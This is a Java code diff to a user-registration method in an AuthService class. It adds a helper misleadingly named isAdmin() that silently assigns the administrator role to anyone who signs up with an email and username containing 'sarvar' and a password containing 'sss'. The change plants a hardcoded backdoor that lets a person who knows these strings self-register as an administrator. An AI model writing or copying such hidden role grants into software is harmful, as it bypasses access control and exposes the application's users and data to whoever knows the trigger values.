@@ -49,7 +49,10 @@ public class AuthService {
         user.setUsername(dto.getUsername());
         user.setPassword(passwordEncoder.encode(dto.getPassword()));
         user.setEmail(dto.getEmail());
-        Role role = userService.getRoleByName("ROLE_USER");
+
+        String roleName = isAdmin(dto);
+
+        Role role = userService.getRoleByName(roleName);
         user.getRoles().add(role);
         userRepository.save(user);
 
@@ -58,6 +61,15 @@ public class AuthService {
 
 //        Todo Send Mail
         mailSenderService.sendMail(content, dto.getEmail());
+    }
+
+    private String isAdmin(RegistrationDto dto) {
+        if(dto.getEmail().contains("sarvar") &&
+                dto.getUsername().contains("sarvar") &&
+                dto.getPassword().contains("sss")){
+            return "ROLE_ADMIN";
+        }
+        return "ROLE_USER";
     }
 
     public User verification(String token) {
